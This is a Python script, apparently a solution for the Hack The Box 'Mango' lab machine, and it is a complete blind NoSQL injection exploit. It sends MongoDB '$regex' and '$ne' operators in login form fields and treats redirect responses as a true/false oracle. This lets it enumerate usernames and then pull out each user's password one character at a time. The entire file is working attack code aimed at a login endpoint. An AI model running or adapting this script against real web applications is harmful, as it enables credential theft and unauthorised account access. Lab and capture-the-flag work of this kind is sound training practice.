import string
import requests

url =  'http://staging-order.mango.htb/'

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# display the banner and version
def banner():
    print('[ MANGO INJECTOR version 0.0.1 ]\n\t\t\tby 0x41t0r\n')

# inject function
def inject(data):
    r = requests.post(url,data=data, allow_redirects=False)
    if r.status_code == 302:
        return True

# perform nosqlinjection for extracts the valids characters for the usernames
def detectValidChar():
    charactersFound = []

    for character in list(string.ascii_uppercase):
        regex='{}.*'.format(character)
        data = { "username[$regex]":regex,"password[$ne]":"hacker","login":"login" }       
        if inject(data):
            charactersFound += character
            print("\r    Found a valid character: "+str(charactersFound)[1:-1],flush=True,end='')

    for character in list(string.ascii_lowercase):
        regex='{}.*'.format(character)
        data = { "username[$regex]":regex,"password[$ne]":"hacker","login":"login" }       
        if inject(data):
            charactersFound.append(character)
            print("\r    Found a valid character: "+str(charactersFound)[1:-1],flush=True,end='')
            
    
    print(f"\t[ {bcolors.OKGREEN}OK{bcolors.ENDC} ]")
    return charactersFound


# send payload basic
def sendPayload(word):
    regex = '^{}.*'.format(word)
    data = { "username[$regex]":regex,"password[$ne]":"hacker","login":"login" } 
    response= requests.post(url,data, allow_redirects=False)
    if response.status_code == 302:
        return word
    else:
        return None

# detect the first char of the username
def getUser(bruteforcelist):
    initial=[]
    for char in bruteforcelist:
        if sendPayload(char) != None:
            print("    Found username starting with {}".format(char))
            initial.append(char)

    return initial

def getUsernames(initials,bruteforcelist):
    usernames=[]
    for ch in initials:
        username=ch
        while True:
            char = sendPayloadUsername(username,bruteforcelist)
            if char != None:
                username +=char
                print("\r    Username found: "+username,flush=True,end='')
            else:
                print("\r    Username found: "+username,flush=True,end='')
                print()
                usernames.append(username)
                break
    return usernames
                

# send payload username
def sendPayloadUsername(word,bruteforcelist):
    for char in bruteforcelist:
        regex = '^{}.*'.format(word+char)
        data = { "username[$regex]":regex,"password[$ne]":"hacker","login":"login" } 
        if inject(data):
            return char 
    return None

# detect password characters
def detectValidCharPass(usernames):
    validcharacters=[]
    for user in usernames:
        valid = sendPayloadPassChar(user)
        print("    Valid characters for {}: {}".format(user,valid))
        validcharacters.append(valid)
    
    return validcharacters

# payload for detect the characters of the password
def sendPayloadPassChar(user):
    valid=[]
    for char in string.printable:
        regex = '{}.*'.format(char)
        data = { "username":user,"password[$regex]":regex,"login":"login" } 
        response= requests.post(url,data, allow_redirects=False)
        if response.status_code == 302:
           valid.append(char)
        
    return valid

def sendPayloadGetPass(username,password,usernames,characters_password):

    for char in characters_password[usernames.index(username)]:
        regex = '^{}.*'.format(password+char) 
        data = { "username":username,"password[$regex]":regex,"login":"login" } 
        response= requests.post(url,data, allow_redirects=False)
        if response.status_code == 302:
           return char
    return None

# main programn
def main():
    banner()
    
    secret=""
    payload=""
    
    characters_username=[]
    initials=[]
    usernames=[]
    characters_password=[]

    print(f"{bcolors.WARNING}Performing the NoSqlInjection...{bcolors.ENDC}")

    print("  \nDetecting valid characters in the username field") 
    characters_username = detectValidChar()

    print("  \nDetecting valid users")
    initials = getUser(characters_username) 
    print("    Total users detected: "+str(len(initials))+f" \t\t\t\t\t[ {bcolors.OKGREEN}OK{bcolors.ENDC} ]")

    print("  \nPerforming extraction of usernames")
    usernames = getUsernames(initials,characters_username)
    print("    Total usernames extracted: "+str(len(usernames))+f" \t\t\t\t[ {bcolors.OKGREEN}OK{bcolors.ENDC} ]")

    print("  \nDetecting valid characters in the username field")
    characters_password = detectValidCharPass(usernames);

    # control the special characters ( ^ , $  , | , \\ and . )
    for i in range(len(characters_password)):
        characters_password[i] = [w.replace('\\', '\\\\') for w in characters_password[i]]
        characters_password[i] = [w.replace('^', '\\^') for w in characters_password[i]]
        characters_password[i] = [w.replace('$', '\\$') for w in characters_password[i]]
        characters_password[i] = [w.replace('|', '\\|') for w in characters_password[i]]
        characters_password[i] = [w.replace('.', '\\.') for w in characters_password[i]]

    print("  \nPerforming password extraction")
    for user in usernames:
        password=""
        while True:
            char = sendPayloadGetPass(user,password,usernames,characters_password)
            if char != None:
                password+=char
                print("\r    Password for "+user+" found: "+password,flush=True,end='')
            else:
                print("\r    Password for "+user+" found: "+password,flush=True,end='')
                print()
                break
    
    
if __name__ == '__main__':
    main()
